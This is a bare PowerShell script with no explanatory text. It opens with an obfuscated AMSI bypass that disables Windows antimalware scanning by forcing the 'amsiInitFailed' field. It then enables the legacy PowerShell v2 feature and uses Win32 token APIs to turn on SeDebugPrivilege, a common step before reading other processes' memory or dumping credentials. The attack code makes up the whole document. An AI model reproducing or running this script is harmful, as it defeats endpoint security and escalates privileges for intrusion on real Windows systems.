$a = "si"; $b = "Am"; $c = "Utils"
$t = [Ref].Assembly.GetType("System.Management.Automation." + $b + $a + $c)
$f = $t.GetField("amsiInitFailed", "NonPublic,Static")
$f.SetValue($null, $true)

# Method 1 - using PowerShell (most reliable)
powershell -c "Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -NoRestart; $priv = 'SeDebugPrivilege'; $type = Add-Type -MemberDefinition '[DllImport(\"advapi32.dll\")] public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength); [DllImport(\"advapi32.dll\")] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle); public struct TOKEN_PRIVILEGES { public int PrivilegeCount; public LUID Luid; public int Attributes; } public struct LUID { public uint LowPart; public int HighPart; }' -Name 'AdjPriv' -PassThru; Write-Host 'Trying to enable SeDebugPrivilege...'"

$privilege = "SeDebugPrivilege"
$type = Add-Type -MemberDefinition @"
using System;
using System.Runtime.InteropServices;
public class TokenAdjuster {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public long Luid;
        public int Attributes;
    }
}
"@ -Name TokenAdjuster -PassThru

$tp = New-Object TokenAdjuster+TOKEN_PRIVILEGES
$tp.PrivilegeCount = 1
$tp.Attributes = 2  # SE_PRIVILEGE_ENABLED
[TokenAdjuster]::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tp.Luid)

$token = [IntPtr]::Zero
[TokenAdjuster]::OpenProcessToken([System.Diagnostics.Process]::GetCurrentProcess().Handle, 0x28, [ref]$token)
[TokenAdjuster]::AdjustTokenPrivileges($token, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)

whoami /priv | findstr Debug
